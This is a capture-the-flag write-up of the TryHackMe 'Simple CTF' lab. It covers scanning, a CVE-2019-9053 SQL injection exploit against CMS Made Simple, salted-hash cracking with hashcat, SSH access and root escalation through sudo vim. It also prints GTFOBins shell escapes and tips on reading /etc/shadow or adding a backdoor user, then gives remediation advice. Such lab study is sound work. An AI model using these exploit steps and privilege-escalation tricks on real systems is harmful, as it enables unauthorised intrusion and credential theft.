# Simple CTF - TryHackMe Write-up

![Simple CTF](https://img.shields.io/badge/Difficulty-Easy-green) ![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue) ![Status](https://img.shields.io/badge/Status-Completed-success)

---

## 📋 Machine Information

| Attribute | Details |
|-----------|---------|
| **Name** | Simple CTF |
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **IP Address** | 10.66.131.180 |
| **Date Completed** | March 15, 2026 |

---

## 🎯 Learning Objectives

This room teaches:
- FTP anonymous access enumeration
- CMS Made Simple identification and version detection
- CVE-2019-9053 SQL Injection exploitation
- MD5 hash cracking with salt
- SSH non-standard port usage (2222)
- Sudo privilege abuse via VIM (GTFOBins)

---

## 🔍 Attack Surface Analysis

### Open Ports & Services

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

### Attack Vectors Identified

```
┌─────────────────────────────────────────┐
│  ATTACK SURFACE                         │
├─────────────────────────────────────────┤
│                                         │
│  21/tcp - FTP (vsftpd 3.0.3)            │
│  ├─ Anonymous login enabled             │
│  ├─ Potential file disclosure           │
│  └─ Risk: Medium                        │
│                                         │
│  80/tcp - HTTP (Apache 2.4.18)          │
│  ├─ CMS Made Simple 2.2.8               │
│  ├─ CVE-2019-9053 (SQL Injection)       │
│  ├─ robots.txt disclosure               │
│  └─ Risk: Critical                      │
│                                         │
│  2222/tcp - SSH (OpenSSH 7.2p2)         │
│  ├─ Non-standard port                   │
│  ├─ Credential-based attack surface     │
│  └─ Risk: Medium (if creds obtained)    │
│                                         │
│  PRIVILEGE ESCALATION                   │
│  ├─ sudo vim (NOPASSWD)                 │
│  ├─ GTFOBins exploitation               │
│  └─ Risk: Critical                      │
│                                         │
└─────────────────────────────────────────┘
```

### Risk Assessment Matrix

| Vulnerability | Likelihood | Impact | Detectability | Priority |
|---------------|------------|--------|---------------|----------|
| CMS Made Simple SQLi | High | Critical | Low | P1 |
| FTP Anonymous Access | High | Low | High | P3 |
| SSH Non-Standard Port | Low | Medium | Medium | P4 |
| Sudo VIM Misconfiguration | High | Critical | Low | P1 |

---

## Exploitation Walkthrough

### Phase 1: Reconnaissance

#### Initial Port Scan

```bash
# Comprehensive scan
nmap -sC -sV -p- 10.66.131.180 -oN nmap_full.txt
```

**Key Findings:**
- FTP (21): Anonymous login allowed
- HTTP (80): Apache 2.4.18 + CMS Made Simple
- SSH (2222): Non-standard port (commonly overlooked!)

**Important Note:** SSH on port **2222** instead of default 22. This is a common technique to avoid automated scanners and requires careful attention during enumeration.

---

#### Web Enumeration

```bash
# Directory fuzzing
gobuster dir -u http://10.66.131.180/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

**Discovered:**
```
/robots.txt           (Status: 200)
/simple/              (Status: 301) → CMS Made Simple
```

**robots.txt content:**
```
Disallow: /
Disallow: /openemr-5_0_1_3
```

---

### Phase 2: CMS Identification

#### Manual Inspection

```bash
# View source code
curl http://10.66.131.180/simple/ | grep -i "generator\|version\|cms"
```

**Critical findings in HTML:**
```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```

**Footer reveals:**
```html
This site is powered by CMS Made Simple version 2.2.8
```

**CMS:** CMS Made Simple  
**Version:** 2.2.8  
**Vulnerability:** CVE-2019-9053 (SQL Injection)

---

### Phase 3: Vulnerability Research

```bash
# SearchSploit
searchsploit cms made simple
```

**Output:**
```
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

**CVE Details:**
- **CVE-2019-9053**
- **Type:** SQL Injection (Time-based Blind)
- **Affected Versions:** < 2.2.10
- **Impact:** Database extraction, credential disclosure

---

### Phase 4: Exploitation - CVE-2019-9053

#### Exploit Execution

**Download exploit:**
```bash
searchsploit -m 46635
```

**Note:** Original exploit is Python 2. Use updated Python 3 version:

```bash
# Download Python 3 compatible exploit
wget https://raw.githubusercontent.com/e-renna/CVE-2019-9053/master/exploit.py -O exploit_py3.py

# Execute with password cracking
python3 exploit_py3.py -u http://10.66.131.180/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

**Exploit Output:**
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
```

**Note:** Exploit may fail at cracking stage due to encoding issues in rockyou.txt.

---

#### Manual Hash Cracking

**What we have:**
- Username: `mitch`
- Password Hash (MD5): `0c01f4468bd75d7a84c7eb73846e8d96`
- Salt: `1dac0d92e9fa6bb2`

**Understanding Salt:**
A salt is random data added to passwords before hashing to prevent rainbow table attacks. Format: `md5(salt + password)` or `md5(password + salt)`.

**Cracking with Hashcat:**

```bash
# Create hash file
echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt

# Crack with hashcat (mode 20 = md5($salt.$pass))
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```

**Credentials Obtained:**
```
Username: mitch
Password: secret
```

---

### Phase 5: Initial Access - SSH

**Critical Detail:** SSH runs on port **2222**, not the default 22!

```bash
# SSH login (note the port!)
ssh mitch@10.66.131.180 -p 2222
# Password: secret
```

**Common Mistake:** Attempting SSH on default port 22 will fail. Always check nmap results carefully for non-standard ports.

---

### Phase 6: User Flag

```bash
# List files
ls -la

# Capture user flag
cat user.txt
```

**User Flag:** `G00d j0b, keep up!`

---

### Phase 7: Privilege Escalation

#### Enumeration

```bash
# Check sudo privileges
sudo -l
```

**Output:**
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

**Critical Finding:** User can run VIM with sudo without password!

---

#### VIM GTFOBins Exploitation

**What is GTFOBins?**

GTFOBins is a curated list of Unix binaries that can be exploited to bypass security restrictions. VIM, when run with sudo, can spawn a root shell.

**Exploitation:**

```bash
# Method 1: Interactive
sudo vim
# Inside vim:
:!bash

# Method 2: One-liner
sudo vim -c ':!/bin/bash'
```

**How it works:**
1. VIM runs with root privileges (sudo)
2. VIM's `:!` command executes shell commands
3. Shell inherits root privileges from VIM
4. Result: Root shell

---

### Phase 8: Root Flag

```bash
# Verify root access
whoami
# Output: root

# Navigate to root directory
cd /root

# Capture root flag
cat root.txt
```

**Root Flag:** `W3ll d0n3. You made it!`

---

## Key Learnings

### 1. CMS Identification Techniques

**Why it matters:**
CMS platforms have known vulnerabilities. Identifying the CMS and version is critical for finding exploits.

**How to identify CMS:**

1. **Meta tags in HTML:**
```html
<meta name="Generator" content="CMS Made Simple" />
```

2. **Footer/Header text:**
```
"Powered by CMS Made Simple version 2.2.8"
```

3. **Tools:**
```bash
# WhatWeb
whatweb http://target.com

# Wappalyzer (browser extension)
```

4. **File structure:**
```
/wp-admin/        → WordPress
/administrator/   → Joomla
/simple/          → CMS Made Simple
```

---

### 2. CVE-2019-9053 - SQL Injection Explained

**Vulnerability Type:** Time-based Blind SQL Injection

**How it works:**

1. **Application vulnerable endpoint:**
```
http://target.com/simple/moduleinterface.php?mact=News,m1_,default,0
```

2. **Injection point:** The `m1_` parameter

3. **Exploitation technique:**
```sql
-- If condition is true, delay response
IF(1=1, SLEEP(5), 0)

-- Extract data character by character
IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)
```

4. **Automated extraction:**
The exploit script automates this process to extract:
- Usernames
- Email addresses
- Password hashes
- Salts

---

### 3. Understanding Password Salts

**What is a salt?**

A salt is random data added to passwords before hashing to prevent:
- Rainbow table attacks
- Identical passwords having identical hashes

**Example:**

```python
# Without salt (VULNERABLE)
hash1 = md5("password123")  # → 482c811da5d5b4bc6d497ffa98491e38
hash2 = md5("password123")  # → 482c811da5d5b4bc6d497ffa98491e38
# Same password = Same hash (attackable with rainbow tables)

# With salt (SECURE)
salt1 = "1dac0d92e9fa6bb2"
hash1 = md5(salt1 + "password123")  # → unique_hash_1

salt2 = "different_salt"
hash2 = md5(salt2 + "password123")  # → unique_hash_2
# Same password + different salt = Different hashes
```

**Why Hashcat needed mode 20:**
- Mode 20: `md5($salt.$pass)` - Salt prepended to password
- Mode 10: `md5($pass.$salt)` - Salt appended to password

**CMS Made Simple uses:** `md5(salt + password)`

---

### 4. SSH on Non-Standard Ports

**Why use non-standard ports?**

1. **Security through obscurity:** Avoid automated scanners
2. **Reduce brute force attempts:** Most bots target port 22
3. **Compliance:** Some regulations require non-standard ports

**Common non-standard SSH ports:**
- 2222 (common alternative)
- 22222
- 22000
- Random high ports (30000+)

**How to find:**
```bash
# Always scan ALL ports
nmap -p- target.com

# Don't assume SSH is on 22!
```

**Connection:**
```bash
# Specify port with -p flag
ssh user@target -p 2222
```

---

### 5. VIM Privilege Escalation (GTFOBins)

**What makes VIM dangerous with sudo?**

VIM can execute shell commands via `:!` while retaining elevated privileges.

**Exploitation methods:**

**Method 1: Interactive shell**
```bash
sudo vim
:!bash
# Spawns root bash shell
```

**Method 2: Direct execution**
```bash
sudo vim -c ':!/bin/bash'
```

**Method 3: Read/write arbitrary files**
```bash
# Read /etc/shadow
sudo vim /etc/shadow

# Write to /etc/passwd (add backdoor user)
sudo vim /etc/passwd
```

**Other GTFOBins examples:**
```bash
# Less
sudo less /etc/profile
!/bin/sh

# Find
sudo find . -exec /bin/sh \; -quit

# Nano (older versions)
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

**Defense:**
```bash
# NEVER allow unrestricted sudo vim
# If needed, restrict to specific files:
user ALL=(ALL) NOPASSWD: /usr/bin/vim /var/log/app.log
```

---

## 🛡️ Remediation Recommendations

### Critical (P1)

**1. Patch CMS Made Simple**
```bash
# Update to latest version (> 2.2.10)
wget https://www.cmsmadesimple.org/downloads/cmsms-2.2.15.tar.gz
# Follow upgrade procedures
```

**2. Remove Sudo VIM Privilege**
```bash
# Edit sudoers
visudo

# REMOVE this line:
# mitch ALL=(root) NOPASSWD: /usr/bin/vim

# If file editing is needed, use alternatives:
# mitch ALL=(root) NOPASSWD: /usr/bin/sudoedit /path/to/specific/file
```

**3. Implement Input Validation**
```php
// Sanitize all user inputs
$input = mysqli_real_escape_string($conn, $_GET['param']);

// Use prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
```

### High (P2)

**4. Disable FTP Anonymous Access**
```bash
# Edit vsftpd configuration
vim /etc/vsftpd.conf

# Set:
anonymous_enable=NO

# Restart service
systemctl restart vsftpd
```

**5. Implement SSH Hardening**
```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no  # Use keys only
MaxAuthTries 3
AllowUsers mitch

# Consider moving back to standard port
# Port 22

# Or implement port knocking if staying on 2222
```

### Medium (P3)

**6. Implement WAF**
```bash
# Install ModSecurity with Apache
apt install libapache2-mod-security2

# Enable OWASP Core Rule Set
wget https://github.com/coreruleset/coreruleset/archive/v3.3.0.tar.gz
```

**7. Regular Security Audits**
```bash
# Automated vulnerability scanning
nikto -h http://target.com
nuclei -u http://target.com

# CMS-specific scanners
cmsmap http://target.com
```

---

## 🔧 Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Port scanning & service detection | `nmap -sC -sV -p- [IP]` |
| Gobuster | Directory enumeration | `gobuster dir -u [URL] -w [wordlist]` |
| WhatWeb | CMS identification | `whatweb [URL]` |
| SearchSploit | Exploit database search | `searchsploit cms made simple` |
| Python 3 | CVE-2019-9053 exploit execution | `python3 exploit.py -u [URL] --crack` |
| Hashcat | Password hash cracking | `hashcat -m 20 hash.txt wordlist.txt` |
| SSH | Remote shell access | `ssh user@[IP] -p 2222` |

---

## References

- [CVE-2019-9053 Details](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- [CMS Made Simple Security Advisory](https://www.cmsmadesimple.org/2019/03/12/announcing-cms-made-simple-2-2-10-sogne/)
- [GTFOBins - VIM](https://gtfobins.github.io/gtfobins/vim/)
- [Hashcat Hash Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

## Timeline

```
00:00 - Initial reconnaissance (Nmap full scan)
00:05 - Web enumeration (Gobuster)
00:10 - CMS identification (Manual + WhatWeb)
00:15 - Vulnerability research (SearchSploit)
00:20 - CVE-2019-9053 exploitation attempt
00:25 - Hash cracking (Hashcat)
00:30 - SSH access (port 2222)
00:35 - User flag captured
00:40 - Privilege escalation enumeration
00:45 - Sudo vim exploitation
00:50 - Root access achieved
00:55 - Root flag captured

Total Time: ~55 minutes
```

---

## 🎯 Flags

```
User Flag: G00d j0b, keep up!
Root Flag: W3ll d0n3. You made it!
```

---

## 💭 Final Thoughts

This room provides excellent practice in:
- **Non-standard port enumeration** (SSH on 2222)
- **CMS vulnerability exploitation** (CVE-2019-9053)
- **Hash cracking with salts** (Understanding cryptographic security)
- **GTFOBins privilege escalation** (VIM sudo abuse)

**Key Takeaway:** Always enumerate thoroughly. Non-standard ports (like SSH on 2222) can be easily overlooked but are critical to the attack chain. CMS identification is essential - version numbers directly map to known vulnerabilities.

**Common Pitfall:** Assuming SSH is always on port 22. Always check nmap output carefully for all discovered ports.

---

**Author:** Igor Leite (UmbraNull)  
**Date:** March 15, 2026  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Status:** ✅ Completed

---

**If you found this write-up helpful, please give it a ⭐ on GitHub!**

**Happy Hacking! 💊🐇**